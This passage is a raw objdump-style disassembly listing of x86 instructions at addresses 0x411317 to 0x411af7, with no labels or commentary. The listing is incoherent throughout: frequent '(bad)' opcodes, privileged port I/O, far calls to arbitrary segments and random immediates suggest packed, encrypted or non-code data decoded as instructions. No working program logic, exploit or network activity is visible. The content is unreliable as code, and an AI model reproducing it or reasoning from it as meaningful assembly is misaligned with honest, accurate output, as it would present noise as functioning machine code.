  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0xc64e61d3
  411322:	inc    edi
  411323:	push   edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx+0x50]
  41132c:	xchg   ebp,eax
  41132d:	sub    DWORD PTR [ebx],0xffffffa7
  411330:	loop   0x4113ad
  411332:	xchg   esp,eax
  411333:	int    0x94
  411335:	or     edi,DWORD PTR [esi-0x1f]
  411338:	ins    BYTE PTR es:[edi],dx
  411339:	mov    ebp,0x700dfd24
  41133e:	shr    ebp,0xa1
  411341:	imul   edi,DWORD PTR [esi],0x9cfe8b5a
  411347:	in     al,dx
  411348:	fs test al,0x71
  41134b:	outs   dx,BYTE PTR ds:[esi]
  41134c:	push   eax
  41134d:	rcr    BYTE PTR [eax],cl
  41134f:	in     al,0xfc
  411351:	outs   dx,DWORD PTR ds:[esi]
  411352:	mov    eax,0xa8f7751d
  411357:	xchg   edi,eax
  411358:	add    DWORD PTR [ecx-0x7b],ebp
  41135b:	imul   ebp,DWORD PTR [esi],0xffffffb7
  41135e:	and    cl,BYTE PTR [ebx+0xa]
  411361:	jp     0x4113af
  411363:	test   eax,0x66cb9c4
  411368:	push   0x3da14e9e
  41136d:	adc    dh,ah
  41136f:	test   al,0x14
  411371:	jns    0x4112f5
  411373:	fwait
  411374:	push   ebp
  411375:	cs in  eax,0xd0
  411378:	mov    al,0x1
  41137a:	ret    
  41137b:	mov    ah,BYTE PTR [ecx]
  41137d:	js     0x4113ad
  41137f:	repz dec edi
  411381:	mov    ebx,0xab624492
  411386:	outs   dx,DWORD PTR ds:[esi]
  411387:	loope  0x41139d
  411389:	xor    eax,0x34f61554
  41138e:	addr16 fs loope 0x411375
  411392:	mov    ebx,0x1353aadd
  411397:	scas   al,BYTE PTR es:[edi]
  411398:	or     cl,BYTE PTR [edi-0x39c26659]
  41139e:	cmp    BYTE PTR [edx+0x47],bh
  4113a1:	sbb    eax,DWORD PTR ds:[ebx]
  4113a4:	xchg   esp,eax
  4113a5:	xor    bh,BYTE PTR [bx+si]
  4113a8:	xchg   esi,eax
  4113a9:	mov    fs,WORD PTR [ebx]
  4113ab:	jge    0x411396
  4113ad:	(bad)  
  4113ae:	int    0x87
  4113b0:	cmc    
  4113b1:	dec    ebp
  4113b2:	iret   
  4113b3:	push   0xd5e04c65
  4113b8:	ss dec eax
  4113ba:	fwait
  4113bb:	xchg   ecx,eax
  4113bc:	jne    0x4113f1
  4113be:	add    cl,bh
  4113c0:	sti    
  4113c1:	mov    bl,0x63
  4113c3:	sub    eax,0x6abd2174
  4113c8:	jl     0x4113cd
  4113ca:	xchg   edx,eax
  4113cb:	push   0xafb6c11d
  4113d0:	dec    eax
  4113d1:	fcmovbe st,st(4)
  4113d3:	leave  
  4113d4:	add    esi,ebp
  4113d6:	loopne 0x41141a
  4113d8:	xor    ecx,DWORD PTR [esi-0x62f42144]
  4113de:	imul   eax,DWORD PTR [ebp-0x41],0x61c9dd2a
  4113e5:	shl    DWORD PTR [eax+ebp*4+0x25],0x27
  4113ea:	fs cmp al,0x7f
  4113ed:	adc    al,0xf3
  4113ef:	push   ds
  4113f0:	inc    ebx
  4113f1:	mov    al,BYTE PTR [esi+edi*2-0x6fbf5cf9]
  4113f8:	jne    0x411425
  4113fa:	jo     0x41144a
  4113fc:	sub    DWORD PTR [edx],edx
  4113fe:	mov    ah,0x70
  411400:	sbb    DWORD PTR [ebx+0x15e7aea],edi
  411406:	(bad)  
  411407:	rcr    edi,cl
  411409:	iret   
  41140a:	daa    
  41140b:	cwde   
  41140c:	sbb    al,al
  41140e:	lea    ecx,[esi]
  411410:	add    BYTE PTR [edx+0x982991],ah
  411416:	repnz aad 0x1f
  411419:	jmp    0x4113d7
  41141b:	call   DWORD PTR cs:[edx-0x80]
  41141f:	das    
  411420:	inc    ebp
  411421:	je     0x4113e9
  411423:	jge    0x411493
  411425:	sbb    eax,0xd87348fe
  41142a:	addr16 test al,0x10
  41142d:	lock and eax,0x8fd1af11
  411433:	xchg   al,bh
  411435:	faddp  st(2),st
  411437:	fidiv  WORD PTR ds:0x29355e73
  41143d:	popf   
  41143e:	out    dx,al
  41143f:	lds    eax,FWORD PTR [ecx+0x78]
  411442:	lods   eax,DWORD PTR es:[esi]
  411444:	arpl   WORD PTR [ebx+edi*8-0x4c],di
  411448:	pusha  
  411449:	shl    BYTE PTR [ecx-0x77514d71],0x72
  411450:	dec    esi
  411451:	call   0xdd65658d
  411456:	out    dx,eax
  411457:	das    
  411458:	repnz mov al,0x3f
  41145b:	(bad)
  41145e:	ja     0x411479
  411460:	cs and al,0x33
  411463:	mov    bl,0x6e
  411465:	stos   DWORD PTR es:[edi],eax
  411466:	cli    
  411467:	xchg   BYTE PTR [edi],cl
  411469:	add    DWORD PTR ds:0x3c5fb4fb,ebx
  41146f:	lods   eax,DWORD PTR ds:[esi]
  411470:	xchg   esp,eax
  411471:	mov    edx,0xb2c82f64
  411476:	jbe    0x4114b8
  411478:	push   0xffffffab
  41147a:	mov    ds,WORD PTR [ebx+ecx*2]
  41147d:	jl     0x411491
  41147f:	add    al,0x7e
  411481:	sbb    ebp,eax
  411483:	shl    BYTE PTR [esi+0x747e7c6a],1
  411489:	add    dh,ch
  41148b:	(bad)
  41148e:	and    eax,0x77cdfb70
  411493:	in     eax,dx
  411494:	xchg   edi,eax
  411495:	add    ah,BYTE PTR [edi+edx*2-0x736dd00c]
  41149c:	lods   eax,DWORD PTR ds:[esi]
  41149d:	dec    edi
  41149e:	fadd   QWORD PTR [esi+0x5b9b5ead]
  4114a4:	loopne 0x411502
  4114a6:	cld    
  4114a7:	test   eax,0xd3a8474b
  4114ac:	scas   al,BYTE PTR es:[edi]
  4114ad:	addr16 aas 
  4114af:	(bad)  
  4114b0:	cmp    DWORD PTR [eax-0x2a5fbb74],esi
  4114b6:	push   cs
  4114b7:	mov    ebp,DWORD PTR [ecx+0x5b]
  4114ba:	push   0x49
  4114bc:	mov    ah,0x50
  4114be:	ficom  DWORD PTR [esi+0x96ce089]
  4114c4:	fsub   st,st(3)
  4114c6:	call   0xa131:0xf18d7ab7
  4114cd:	inc    ecx
  4114ce:	xchg   edi,eax
  4114cf:	(bad)  [ecx+eiz*1]
  4114d2:	and    DWORD PTR ds:0x11b470f7,ecx
  4114d8:	out    0xf4,al
  4114da:	inc    ebp
  4114db:	retf   0xf0e0
  4114de:	ins    BYTE PTR es:[di],dx
  4114e0:	scas   al,BYTE PTR es:[edi]
  4114e1:	aad    0xeb
  4114e3:	and    ecx,DWORD PTR [edi+0x31]
  4114e6:	fmul   DWORD PTR [ebp+0x2]
  4114e9:	jne    0x411566
  4114eb:	mov    cl,0x5e
  4114ed:	sub    eax,0x3b64aadb
  4114f2:	iret   
  4114f3:	cwde   
  4114f4:	mov    esp,0xc0c35b04
  4114f9:	jae    0x41150f
  4114fb:	dec    esp
  4114fc:	test   al,0xbd
  4114fe:	jmp    0x4114f7
  411500:	ss call 0xa0a6:0x2ce3cf6e
  411508:	in     eax,dx
  411509:	push   es
  41150a:	loop   0x4114f6
  41150c:	sbb    eax,0xb7ccf43c
  411511:	mov    ds:0x1078bf59,eax
  411516:	outs   dx,BYTE PTR ds:[esi]
  411517:	adc    eax,0xe53a6559
  41151c:	sub    ebp,DWORD PTR [eax]
  41151e:	mov    dh,0x4e
  411520:	repz add BYTE PTR [ebx],dl
  411523:	call   0x6fb6:0x65347650
  41152a:	mov    esi,0xc257be62
  41152f:	es push edx
  411531:	(bad)  
  411532:	jle    0x411596
  411534:	les    edx,FWORD PTR [edx]
  411536:	push   ds
  411537:	xchg   ebp,eax
  411538:	popfw  
  41153a:	pop    ebp
  41153b:	in     al,dx
  41153c:	mov    bh,BYTE PTR [ecx-0x7fe3a360]
  411542:	aam    0x20
  411544:	mov    bl,BYTE PTR [edx]
  411546:	std    
  411547:	inc    ebp
  411548:	lahf   
  411549:	jmp    DWORD PTR [edx+0x58861023]
  41154f:	shl    BYTE PTR [ebx-0x38feb4ac],0x75
  411556:	sub    edx,DWORD PTR [ebx-0x2a68d9ac]
  41155c:	adc    dh,BYTE PTR [esp+ecx*1+0x2e595a25]
  411563:	and    dh,BYTE PTR [edi-0x3ebc5f2]
  411569:	outs   dx,BYTE PTR cs:[esi]
  41156b:	or     DWORD PTR [edx+0x3230d91],0x25b41188
  411575:	and    eax,0x4b42bed5
  41157a:	pop    ds
  41157b:	inc    ebx
  41157c:	pop    edx
  41157d:	rcr    al,1
  41157f:	mov    BYTE PTR [ebx+0x2b],ah
  411582:	cwde   
  411583:	mul    BYTE PTR [esi+ecx*8]
  411586:	enter  0x4e08,0x49
  41158a:	or     BYTE PTR [ebp-0x48567ba9],0x10
  411591:	inc    esi
  411592:	or     edi,DWORD PTR [ecx]
  411594:	or     dh,BYTE PTR [ebx]
  411596:	mov    esi,0x940ce7a9
  41159b:	mov    ds:0xa2005c9f,eax
  4115a0:	sbb    eax,0xbd6053a6
  4115a5:	int    0x2e
  4115a7:	dec    BYTE PTR [ebp+0x27d08a4]
  4115ad:	push   ebx
  4115ae:	add    al,0x4b
  4115b0:	hlt    
  4115b1:	loopne 0x41160c
  4115b3:	push   edi
  4115b4:	cs in  al,dx
  4115b6:	std    
  4115b7:	imul   ebx,ebx,0xffffffa5
  4115ba:	out    0x88,al
  4115bc:	push   esp
  4115bd:	or     eax,0x22c66139
  4115c2:	mov    edi,0x95e97769
  4115c7:	pop    ebp
  4115c8:	shl    BYTE PTR [edx],cl
  4115ca:	dec    ecx
  4115cb:	pop    ebx
  4115cc:	stos   DWORD PTR es:[edi],eax
  4115cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ce:	call   0x2d10:0xf9d70fdd
  4115d5:	xor    al,0xac
  4115d7:	pop    ss
  4115d8:	in     al,dx
  4115d9:	dec    esi
  4115da:	inc    esp
  4115db:	jbe    0x411579
  4115dd:	sti    
  4115de:	add    ebx,DWORD PTR [esi+0x66]
  4115e1:	enter  0x48af,0x16
  4115e5:	jnp    0x411651
  4115e7:	cld    
  4115e8:	sbb    BYTE PTR [edx+0x557f9c2d],0x2
  4115ef:	pop    esi
  4115f0:	mov    esp,0x968a704b
  4115f5:	mov    ecx,DWORD PTR ss:[esi-0x71]
  4115f9:	sbb    cl,BYTE PTR [ebx+0x4d]
  4115fc:	call   0x9db2:0x581b167e
  411603:	int3   
  411604:	lahf   
  411605:	mov    cs,WORD PTR [edi+eiz*1+0x401a204c]
  41160c:	push   ss
  41160d:	push   ecx
  41160e:	jge    0x41165b
  411610:	or     bl,BYTE PTR cs:[ecx]
  411613:	add    eax,0x4223e319
  411618:	xor    al,0xb3
  41161a:	stc    
  41161b:	sub    ch,BYTE PTR [ecx+ebx*4-0x54]
  41161f:	bound  edx,QWORD PTR gs:[ecx+0x14392585]
  411626:	or     DWORD PTR [ebx],ebx
  411628:	dec    edx
  411629:	mov    esp,0x5c445a62
  41162e:	out    dx,eax
  41162f:	mov    eax,ds:0x76462af6
  411634:	cld    
  411635:	cmc    
  411636:	(bad)  
  411637:	clc    
  411638:	ficomp WORD PTR [ecx-0x405cbfbe]
  41163e:	mov    ebp,0x43e6383e
  411643:	aas    
  411644:	xchg   ebp,eax
  411645:	push   edi
  411646:	daa    
  411647:	(bad)  [eax]
  411649:	icebp  
  41164a:	(bad)  
  41164b:	and    DWORD PTR [eax+0x7f0f8d1],esp
  411651:	inc    ecx
  411652:	lds    esp,FWORD PTR [edx+0x1f4972ed]
  411658:	cmp    cl,bl
  41165a:	out    dx,eax
  41165b:	daa    
  41165c:	mov    ds:0x972d4229,al
  411661:	mov    bh,0x75
  411663:	sbb    eax,0x68014908
  411668:	sub    DWORD PTR [ecx],ebp
  41166a:	mov    edx,0x6ecd6d5
  41166f:	dec    esp
  411670:	sub    dh,BYTE PTR [eax+0x5a]
  411673:	ret    
  411674:	dec    esi
  411675:	fadd   st(1),st
  411677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411678:	cld    
  411679:	out    0xa9,al
  41167b:	sub    edi,eax
  41167d:	stc    
  41167e:	inc    eax
  41167f:	in     eax,0xa0
  411681:	inc    ebp
  411682:	(bad)  
  411683:	ins    BYTE PTR es:[edi],dx
  411684:	stos   BYTE PTR es:[edi],al
  411685:	retf   0x5b75
  411688:	hlt    
  411689:	cmp    DWORD PTR fs:[ebp+0x751c9dff],edx
  411690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411691:	ja     0x4116c6
  411693:	jp     0x4116c0
  411695:	outs   dx,BYTE PTR ds:[esi]
  411696:	arpl   WORD PTR [edx-0x1a],ax
  411699:	cmp    DWORD PTR [edx+0x7d6ff3b9],eax
  41169f:	jle    0x41164e
  4116a1:	xor    al,0x16
  4116a3:	mov    ecx,DWORD PTR [edi-0x72793572]
  4116a9:	out    dx,eax
  4116aa:	dec    ecx
  4116ab:	pop    esi
  4116ac:	cmp    ecx,edi
  4116ae:	mov    al,BYTE PTR [esi]
  4116b0:	and    eax,0xfbe3f954
  4116b5:	pop    ds
  4116b6:	xor    cl,ch
  4116b8:	add    al,0x56
  4116ba:	retf   
  4116bb:	js     0x4116ff
  4116bd:	jb     0x411645
  4116bf:	inc    eax
  4116c0:	add    al,0x8a
  4116c2:	adc    BYTE PTR [edx+0x6df4113b],al
  4116c8:	sub    edi,DWORD PTR [ebp+0x31]
  4116cb:	aad    0x21
  4116cd:	outs   dx,DWORD PTR ds:[esi]
  4116ce:	in     al,0x88
  4116d0:	dec    edx
  4116d1:	aad    0xdb
  4116d3:	cmp    DWORD PTR [edx+0x3f],ebx
  4116d6:	sbb    eax,0x4cdd7346
  4116db:	lock push ds
  4116dd:	mov    edx,0xc1bdb0c
  4116e2:	push   0xd47e3645
  4116e7:	cmc    
  4116e8:	mov    ah,BYTE PTR [eax]
  4116ea:	fstp   TBYTE PTR [ebx+0x3f]
  4116ed:	adc    cl,ah
  4116ef:	out    dx,al
  4116f0:	pop    ecx
  4116f1:	int    0x71
  4116f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116f4:	ins    BYTE PTR es:[edi],dx
  4116f5:	out    dx,eax
  4116f6:	adc    edi,DWORD PTR [ebp+0x23]
  4116f9:	imul   edx,DWORD PTR [eax-0x35da657c],0x9963c7fe
  411703:	xor    ebx,DWORD PTR [eax]
  411705:	add    eax,0xd60087fa
  41170a:	test   esp,0xbac934c7
  411710:	lods   eax,DWORD PTR ds:[esi]
  411711:	pushf  
  411712:	mul    BYTE PTR ds:0x3562db9f
  411718:	push   cs
  411719:	xchg   esi,eax
  41171a:	es adc al,0x2
  41171d:	push   0xffffffd4
  41171f:	loop   0x411796
  411721:	sub    edx,edi
  411723:	push   es
  411724:	lock fidivr WORD PTR [edi+0x38]
  411729:	and    ebx,edi
  41172b:	adc    DWORD PTR [esi],edx
  41172d:	inc    ch
  41172f:	fisub  WORD PTR [ebx+0x2d]
  411732:	das    
  411733:	das    
  411734:	xchg   esi,eax
  411735:	popf   
  411736:	xor    eax,0x1a870633
  41173b:	cmp    DWORD PTR [ebp-0x365cec35],ebx
  411741:	mov    bh,0x18
  411743:	push   es
  411744:	(bad)  
  411745:	mov    ch,0x6c
  411747:	call   0x86f8:0xd5fc51b2
  41174e:	pop    ecx
  41174f:	inc    ecx
  411750:	imul   edi,DWORD PTR [ecx+0x2a5bfc0f],0x6
  411757:	dec    esp
  411758:	push   ss
  411759:	push   edx
  41175a:	cld    
  41175b:	sahf   
  41175c:	loopne 0x4117ac
  41175e:	lahf   
  41175f:	inc    edx
  411760:	cwde   
  411761:	retf   
  411762:	dec    eax
  411763:	call   0x6905:0x505dd9dc
  41176a:	sub    al,0xec
  41176c:	pop    edx
  41176d:	retf   0x9d26
  411770:	sbb    al,0x52
  411772:	retf   0x770c
  411775:	add    al,0x44
  411777:	lods   al,BYTE PTR ds:[esi]
  411778:	mov    edi,0x604a01b0
  41177d:	mov    BYTE PTR [ecx+0x46],0x42
  411781:	scas   eax,DWORD PTR es:[edi]
  411782:	jno    0x411754
  411784:	leave  
  411785:	xor    esi,DWORD PTR [ecx]
  411787:	mov    DWORD PTR [edx],ebx
  411789:	jmp    0xa856:0xf10e654d
  411790:	or     DWORD PTR [esi+0x5a9d9fad],eax
  411796:	mov    al,bl
  411798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411799:	fst    QWORD PTR [eax+0x4e]
  41179c:	inc    esp
  41179d:	add    DWORD PTR [ecx],edi
  41179f:	jge    0x4117d3
  4117a1:	dec    edx
  4117a2:	sti    
  4117a3:	mov    edi,0xab5c6f5c
  4117a8:	je     0x4117b2
  4117aa:	arpl   WORD PTR [ebx+edx*4-0x3e],di
  4117ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117af:	mov    bh,0x76
  4117b1:	jg     0x4117e1
  4117b3:	adc    esp,DWORD PTR [ebx+0x6d0f6465]
  4117b9:	xor    DWORD PTR [ecx],0x11cc1dc1
  4117bf:	fs mov esp,0x49e0a286
  4117c5:	or     DWORD PTR [ebx+0x4b],ecx
  4117c8:	cdq    
  4117c9:	jb     0x411785
  4117cb:	push   esi
  4117cc:	adc    al,0xce
  4117ce:	push   ebx
  4117cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117d0:	imul   BYTE PTR [ebp+0x3fa50645]
  4117d6:	push   eax
  4117d7:	jmp    0xe7206615
  4117dc:	jp     0x4117c5
  4117de:	rcr    BYTE PTR [ebx],0x41
  4117e1:	sbb    BYTE PTR [edi-0x34978311],bl
  4117e7:	sub    al,BYTE PTR [esi]
  4117e9:	mov    bl,0xea
  4117eb:	in     eax,0xf8
  4117ed:	jae    0x41180e
  4117ef:	pop    ss
  4117f0:	sti    
  4117f1:	test   eax,0x92b0f7f
  4117f6:	and    ebx,eax
  4117f8:	xor    DWORD PTR [esi],esi
  4117fa:	push   eax
  4117fb:	stos   DWORD PTR es:[edi],eax
  4117fc:	lahf   
  4117fd:	fnstsw WORD PTR [edi-0x78]
  411800:	mov    ah,0xc
  411802:	xchg   esp,eax
  411803:	jae    0x411808
  411805:	(bad)
  411808:	icebp  
  411809:	das    
  41180a:	(bad)  
  41180b:	mov    dl,0x8c
  41180d:	mov    al,ds:0x7cb8f75d
  411812:	push   edi
  411813:	push   edi
  411814:	ss scas al,BYTE PTR es:[edi]
  411816:	sbb    BYTE PTR [edi-0x10],0xdb
  41181a:	dec    ebx
  41181b:	xor    BYTE PTR [edi],dh
  41181d:	mov    ds:0xc4d40dd1,al
  411822:	pop    ds
  411823:	xchg   ebp,eax
  411824:	mov    al,ds:0x5379d771
  411829:	mov    ds:0xff14d4d3,eax
  41182e:	sub    esp,DWORD PTR [edi]
  411830:	mov    bl,0x1f
  411832:	retf   0xfed2
  411835:	lods   al,BYTE PTR ds:[esi]
  411836:	call   0xf0644d6a
  41183b:	mov    ecx,DWORD PTR [edx-0x3de06974]
  411841:	push   0x7afd9d23
  411846:	dec    ecx
  411847:	pusha  
  411848:	or     dl,BYTE PTR [edi-0x1f]
  41184b:	cmp    esp,eax
  41184d:	push   0x644e8b1b
  411852:	push   eax
  411853:	add    DWORD PTR [ebx+ebx*1-0x2],ebp
  411857:	aad    0x91
  411859:	retf   0xb514
  41185c:	mov    bh,0xf3
  41185e:	out    dx,eax
  41185f:	jno    0x41182d
  411861:	mov    cl,0x1a
  411863:	lock push esi
  411865:	bound  ecx,QWORD PTR [ebx+ecx*1+0x3b359479]
  41186c:	lahf   
  41186d:	js     0x4118e5
  41186f:	lahf   
  411870:	hlt    
  411871:	(bad)  
  411872:	jge    0x41184f
  411874:	lods   eax,DWORD PTR ds:[esi]
  411875:	mov    WORD PTR [eax-0x5faa90d7],cs
  41187b:	popa   
  41187c:	and    eax,0xc7609e7e
  411881:	inc    ecx
  411882:	cmp    eax,0x50047e0a
  411887:	jno    0x41188b
  411889:	loopne 0x4118c5
  41188b:	repz xor edi,0xffffffff
  41188f:	mov    dh,0x83
  411891:	mov    bl,0x9
  411893:	mov    bh,0xde
  411895:	xchg   esi,eax
  411896:	cmp    DWORD PTR [eax+0x79d432f8],eax
  41189c:	jmp    0x4118fe
  41189e:	adc    BYTE PTR [ecx+0x256b96d2],ch
  4118a4:	fcomp  DWORD PTR [ecx+eax*8]
  4118a7:	add    dl,BYTE PTR [edx]
  4118a9:	xor    ch,dl
  4118ab:	iret   
  4118ac:	mov    cl,0xaf
  4118ae:	cwde   
  4118af:	inc    ebp
  4118b0:	stc    
  4118b1:	push   ds
  4118b2:	xchg   edi,eax
  4118b3:	adc    eax,0xd5bb916c
  4118b8:	or     cl,0x20
  4118bb:	jl     0x41189d
  4118bd:	out    dx,eax
  4118be:	sub    DWORD PTR [edx+0x51],0x36
  4118c2:	arpl   WORD PTR [edi+eax*1],ax
  4118c5:	dec    ebx
  4118c6:	inc    ebp
  4118c7:	lahf   
  4118c8:	push   esp
  4118c9:	mov    DWORD PTR [ecx],ebx
  4118cb:	stos   BYTE PTR es:[edi],al
  4118cc:	cwde   
  4118cd:	fcomp  st(7)
  4118cf:	inc    edx
  4118d0:	les    ecx,FWORD PTR [edi+eax*4+0x4e]
  4118d4:	mov    ds:0xf9088b01,al
  4118d9:	(bad)  
  4118da:	pop    esi
  4118db:	xor    DWORD PTR [ecx-0x5d846830],eax
  4118e1:	pop    ecx
  4118e2:	sub    eax,0x9de7eae4
  4118e7:	inc    eax
  4118e8:	sbb    dl,cl
  4118ea:	sub    edi,edx
  4118ec:	push   0xffffff88
  4118ee:	adc    BYTE PTR [edx],dl
  4118f0:	ins    BYTE PTR es:[edi],dx
  4118f1:	(bad)  
  4118f2:	in     eax,dx
  4118f3:	in     eax,dx
  4118f4:	sbb    DWORD PTR [esi+edx*2+0x17],esp
  4118f8:	fmul   DWORD PTR [ebx-0x219f62f5]
  4118fe:	cwde   
  4118ff:	ret    0xceec
  411902:	not    BYTE PTR [ecx-0x43]
  411905:	(bad)  
  411906:	aam    0x9c
  411908:	mov    al,ds:0x3420e489
  41190d:	popf   
  41190e:	xchg   DWORD PTR [ebx+0x51],edi
  411911:	mov    BYTE PTR [edx+0x5f],al
  411914:	and    eax,DWORD PTR [esi-0x748c5891]
  41191a:	loopne 0x41191a
  41191c:	jne    0x4118ae
  41191e:	lahf   
  41191f:	mov    cl,0xb9
  411921:	push   esi
  411922:	ins    DWORD PTR es:[edi],dx
  411923:	jns    0x4118c2
  411925:	jno    0x4118fd
  411927:	sbb    edi,DWORD PTR ds:0x2af4d420
  41192d:	add    bh,bh
  41192f:	imul   ebx,DWORD PTR [esi-0x4ee5678],0x78c77ba7
  411939:	daa    
  41193a:	repz fnsave [edx]
  41193d:	xor    eax,0xdb274b15
  411942:	and    DWORD PTR [eax-0x2c],esp
  411945:	cwde   
  411946:	je     0x41198d
  411948:	sub    eax,0xeefe60b7
  41194d:	jmp    0x5142b121
  411952:	adc    dh,0xd
  411955:	jmp    0xc6f4:0xe62824f5
  41195c:	arpl   si,dx
  41195e:	in     al,dx
  41195f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411960:	xlat   BYTE PTR ds:[ebx]
  411961:	pop    ss
  411962:	pop    ds
  411963:	xchg   ecx,eax
  411964:	ret    0x7899
  411967:	(bad)  
  411968:	pop    esp
  411969:	and    al,0x96
  41196b:	or     ah,BYTE PTR [eax]
  41196d:	add    al,0x96
  41196f:	test   eax,0x75070121
  411974:	push   esp
  411975:	dec    ecx
  411976:	pop    esp
  411977:	inc    esp
  411978:	push   cs
  411979:	aad    0xa1
  41197b:	mov    edx,eax
  41197d:	inc    eax
  41197e:	xor    DWORD PTR [edx],0x96421ddb
  411984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411985:	and    BYTE PTR [ecx-0x26],ah
  411988:	lea    edi,[ebx+ecx*1]
  41198b:	inc    ebx
  41198c:	jo     0x4119ac
  41198e:	push   edi
  41198f:	mov    ecx,0x9f630161
  411994:	xchg   DWORD PTR [edi+0x40],edx
  411997:	push   0x64
  411999:	sub    dl,al
  41199b:	lds    edx,FWORD PTR [ecx]
  41199d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41199e:	xor    eax,DWORD PTR [ecx]
  4119a0:	test   DWORD PTR [ecx-0x10],eax
  4119a3:	pop    es
  4119a4:	push   ecx
  4119a5:	mov    ebx,0xbdfd0081
  4119aa:	into   
  4119ab:	in     al,dx
  4119ac:	repnz mov al,0xe9
  4119af:	(bad)  
  4119b1:	call   0xcdca3a14
  4119b6:	rcr    al,cl
  4119b8:	retf   0x12cc
  4119bb:	push   ecx
  4119bc:	or     ebx,DWORD PTR [ecx]
  4119be:	and    ch,BYTE PTR [edi-0x15e2ff03]
  4119c4:	call   0xf90b:0x2632980e
  4119cb:	mov    cl,BYTE PTR [ecx+0x7f443e54]
  4119d1:	mov    dl,0x2b
  4119d3:	scas   al,BYTE PTR es:[edi]
  4119d4:	lea    esi,[eax]
  4119d6:	jl     0x4119e9
  4119d8:	xor    dl,BYTE PTR [esi+0x0]
  4119db:	pop    ss
  4119dc:	push   edx
  4119dd:	sbb    BYTE PTR ds:0xa84716f1,0x95
  4119e4:	xchg   BYTE PTR [edx+ebx*8],cl
  4119e7:	xchg   ebp,eax
  4119e8:	sti    
  4119e9:	imul   esp,esi,0xffffffac
  4119ec:	bound  ecx,QWORD PTR [edi]
  4119ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ef:	inc    eax
  4119f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119f1:	push   ds
  4119f2:	add    DWORD PTR [edx+ecx*2],edx
  4119f5:	mov    eax,ds:0xc1401214
  4119fa:	mov    eax,ds:0x9140dd4e
  4119ff:	scas   al,BYTE PTR es:[edi]
  411a00:	adc    cl,ah
  411a02:	jb     0x411994
  411a04:	push   0xffffff85
  411a06:	retf   0xcef
  411a09:	jnp    0x4119d8
  411a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a0c:	outs   dx,DWORD PTR ds:[esi]
  411a0d:	ds fcom st(3)
  411a10:	ficom  WORD PTR [edx]
  411a12:	cmp    cl,dl
  411a14:	jbe    0x4119ad
  411a16:	lods   al,BYTE PTR ds:[esi]
  411a17:	jle    0x411a8a
  411a19:	adc    ah,BYTE PTR [edx+0x2a]
  411a1c:	pop    edi
  411a1d:	inc    DWORD PTR [esi-0x1f824ba7]
  411a23:	stc    
  411a24:	mov    esp,DWORD PTR [edx]
  411a26:	outs   dx,DWORD PTR ds:[esi]
  411a27:	mov    esp,0xb9afbe01
  411a2c:	outs   dx,BYTE PTR ds:[esi]
  411a2d:	jo     0x4119e5
  411a2f:	pop    esp
  411a30:	stc    
  411a31:	lahf   
  411a32:	in     al,dx
  411a33:	inc    esp
  411a34:	inc    esi
  411a35:	inc    eax
  411a36:	pop    esi
  411a37:	push   es
  411a38:	ror    DWORD PTR [ecx-0x2429fdad],1
  411a3e:	gs icebp 
  411a40:	xchg   ebx,eax
  411a41:	mov    dl,0xcb
  411a43:	sbb    eax,0x64faaacc
  411a48:	adc    eax,0x36
  411a4b:	mov    edi,0x4209d732
  411a50:	aam    0xe9
  411a52:	mov    esi,0x43fcb669
  411a57:	ret    
  411a58:	loopne 0x411a48
  411a5a:	inc    ebp
  411a5b:	add    eax,0x95b5cac9
  411a60:	xor    DWORD PTR [eax],0x7f
  411a63:	dec    ebp
  411a64:	or     eax,0xbf94ae89
  411a69:	and    edx,DWORD PTR [esi-0x59277c2e]
  411a6f:	retf   
  411a70:	loop   0x411a16
  411a72:	gs sti 
  411a74:	inc    esp
  411a75:	sub    ch,bl
  411a77:	xor    al,0xc8
  411a79:	nop
  411a7a:	imul   ebp,DWORD PTR [edi-0x66c72600],0x9f816740
  411a84:	or     dl,ch
  411a86:	xor    DWORD PTR [esi],ebp
  411a88:	je     0x411a90
  411a8a:	mov    dl,0xf4
  411a8c:	imul   edi,DWORD PTR [ebx+0x47896d7e],0xffffff84
  411a93:	es jecxz 0x411a5b
  411a96:	xor    ch,BYTE PTR [ebx+ecx*8]
  411a99:	std    
  411a9a:	xchg   ebx,eax
  411a9b:	xchg   BYTE PTR [esi-0x1bdd91b2],bl
  411aa1:	mov    bl,0xe0
  411aa3:	fcmovnb st,st(4)
  411aa5:	dec    esi
  411aa6:	add    esi,DWORD PTR [eax+edi*2+0x37ab1a37]
  411aad:	and    al,0xcd
  411aaf:	in     al,0xe4
  411ab1:	sbb    eax,0xbf4aaef0
  411ab6:	and    cl,al
  411ab8:	lods   eax,DWORD PTR ds:[esi]
  411ab9:	inc    esi
  411aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411abb:	push   cs
  411abc:	outs   dx,DWORD PTR ds:[esi]
  411abd:	push   ds
  411abe:	cli    
  411abf:	sub    eax,0x81bfec46
  411ac4:	xor    al,0x5e
  411ac6:	lahf   
  411ac7:	loope  0x411aa5
  411ac9:	mov    eax,ds:0xdacabfef
  411ace:	or     BYTE PTR [ecx],bl
  411ad0:	out    dx,eax
  411ad1:	in     eax,0x8a
  411ad3:	js     0x411b30
  411ad5:	test   eax,0xc6439e4c
  411ada:	jo     0x411a72
  411adc:	lods   al,BYTE PTR ds:[esi]
  411add:	dec    edx
  411ade:	mov    bl,0xa9
  411ae0:	xchg   BYTE PTR [ebp+0xf0c6351],al
  411ae6:	xor    BYTE PTR [esi],ch
  411ae8:	mov    ebp,0x6e9dea73
  411aed:	xor    ch,BYTE PTR [edi-0x6c7a19eb]
  411af3:	mov    ch,0xbc
  411af5:	mov    ah,0x43
  411af7:	stc    
